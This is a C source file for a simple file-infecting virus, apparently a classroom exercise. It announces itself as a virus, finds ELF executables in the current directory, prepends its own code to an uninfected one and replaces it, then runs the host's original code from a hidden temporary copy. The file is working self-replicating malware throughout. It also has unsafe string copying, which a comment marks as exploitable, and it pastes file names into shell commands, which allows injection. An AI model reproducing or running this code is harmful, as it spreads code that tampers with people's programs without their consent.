#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
	system("/bin/echo 'Hello! I am a simple virus!'"); // show we're infected.
	int bytesForProg = 9553;
	// magic command is: find . -exec file {} \; | grep -i elf | awk '{print $1}' | sed s/://
	
	//char infect[256];
	
	FILE * fptr;
	system("find . -exec file {} \\; | grep -i elf | awk '{print $1}' | sed s/:// | sed s'/.\\///' > /tmp/temp.txt"); // I REALLY DIDNT WANNA EDIT THIS IN C, I AM SORRY
	fptr = fopen("/tmp/temp.txt", "r");  // open file for reading.
	char call[1024];
	char line[256];
	char infect[256];
	while(fgets(line, sizeof(line), fptr)) {
		strtok(line, "\n");
		snprintf(call, sizeof(call), "cmp -n %d %s virus > /tmp/temp2.txt", (bytesForProg - 1), line);
		system("rm /tmp/temp2.txt | true");
		system(call);
		//printf("%s\n", call);
		FILE *fp;
		fp = fopen("/tmp/temp2.txt", "r");
		fseek(fp, 0L, SEEK_END);
		int sz = ftell(fp);
		if(sz > 0){
			strncpy(infect, line, 20);
			//infect = line;
			break;
		}
	}
	char systemCall[1024];
	
	if(strlen(infect) != 0) { // no more to infect!
		char infectVir[1024];
		char infectOld[1024]; // EXPLOITABLE :D
		// now we infect another program. We're going to infect 'infect'.
		// create infectVir	
		strcpy(infectVir, infect);
		strcat(infectVir, "Vir");
		
		//create infectOld
		strcpy(infectOld, infect);
		strcat(infectOld, "Old");
	
		snprintf(systemCall,sizeof(systemCall), "cat virus %s > %s", infect, infectVir);
		system(systemCall);
		//system("cat virus echo > echoVir"); // this adds our virus to the other one, "infecting" it.
		snprintf(systemCall,sizeof(systemCall), "rm %s", infect);
		system(systemCall);
		//system("rm echo");
		snprintf(systemCall,sizeof(systemCall), "mv %s %s", infectVir, infect);
		system(systemCall);
		//system("mv echoVir echo");
		snprintf(systemCall,sizeof(systemCall), "chmod u+x %s", infect);
		system(systemCall);
		//system("chmod u+x echo"); // it's infected.
	}
	// if we're just virus, just return.
	if(strcmp(argv[0], "./virus") == 0) {
		return 0;
	}
			
	
	// NOW run our program normally.
	char* ourProg = argv[0];
	ourProg = ourProg + 2;
	//printf("%s\n", ourProg);
	char ourProgHidden[1024];
	snprintf(ourProgHidden, sizeof(ourProgHidden), ".%sUn", ourProg);
	//printf("%s\n", ourProgHidden);
	
	snprintf(systemCall, sizeof(systemCall), "tail -c +%d %s > %s", bytesForProg, ourProg, ourProgHidden);
	system(systemCall);
        //system("tail -c +8305 date > .dateUn"); // TODO figure out actual size and replace with the current number. This is of 'virusTest'
        snprintf(systemCall, sizeof(systemCall), "chmod +x %s", ourProgHidden);
	system(systemCall);
	//system("chmod +x .dateUn"); // make it executable.
	char buffer[1024];
	snprintf(buffer, sizeof(buffer), "./%s ", ourProgHidden);
        //strcpy(buffer, "./.dateUn ");
        int i;
        for(i = 1; i != argc; i++) {
                strcat(buffer, argv[i]); // command line args
                strcat(buffer, " ");
        }
	//system("/bin/echo 'Hello! I am a simple virus!'"); // show we're infected.
	//printf("\n\n\n%s\n\n\n",buffer); 
	system(buffer);
	snprintf(systemCall, sizeof(systemCall), "rm %s", ourProgHidden);
	system(systemCall);
	//system("rm .dateUn");
	
        // return
        return 0;
}
